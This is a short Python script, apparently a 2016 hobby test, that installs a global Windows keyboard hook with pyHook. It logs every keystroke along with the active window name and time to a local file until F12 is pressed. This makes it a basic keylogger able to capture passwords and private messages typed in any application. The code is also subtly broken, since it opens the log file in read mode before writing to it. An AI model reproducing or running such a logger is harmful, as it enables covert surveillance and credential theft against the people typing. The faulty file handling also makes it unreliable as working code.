# coding:utf-8

#    __author__ = 'Mark sinoberg'
#    __date__ = '2016/6/24'
#    __Desc__ = 测试对键盘事件的统计
import pythoncom
import pyHook
import time
import win32api

t = ''
asciistr = ''
keystr = ''

def onKeyboardEvent(event):
    global t ,asciistr,keystr
    filename = r'F:/log.txt'
    wrfile = open(filename,'rb')
    # 处理键盘事件
    if t == str(event.WindowName):
        asciistr = asciistr+chr(event.Ascii)
        keystr = keystr + str(event.Key)
    else:
        t = str(event.WindowName)
        if asciistr == '' and keystr == '':
            wrfile.writelines("\nWindow:%s\n" % str(event.Window))
            wrfile.writelines("WindowName:%s\n" % str(event.WindowName))  # 写入当前窗体名
            wrfile.writelines("MessageName:%s\n" % str(event.MessageName))
            wrfile.writelines("Message:%d\n" % event.Message)
            wrfile.writelines("Time:%s\n" % time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()))
        else:
            wrfile.writelines("Ascii_char:%s\n" % asciistr)
            wrfile.writelines("Key_char:%s\n" % keystr)
            wrfile.writelines("\nWindow:%s\n" % str(event.Window))
            wrfile.writelines("WindowName:%s\n" % str(event.WindowName))  # 写入当前窗体名
            wrfile.writelines("Time:%s\n" % time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()))

        asciistr = chr(event.Ascii)
        keystr = str(event.Key)
    if str(event.Key) == 'F12':  # 按下F12后终止
        wrfile.writelines("Ascii_char:%s\n" % asciistr)
        wrfile.writelines("Key_char:%s\n" % keystr)
        wrfile.close()
        win32api.PostQuitMessage()

    return True


if __name__ =="__main__":
    # 创建Hook句柄
    hm = pyHook.HookManager()

    # 监控键盘
    hm.KeyDown = onKeyboardEvent
    hm.HookKeyboard()

    # 循环获取信息.需要手动的进行关闭。遗憾的是竟然还需有手动的创建这个文件
    pythoncom.PumpMessages()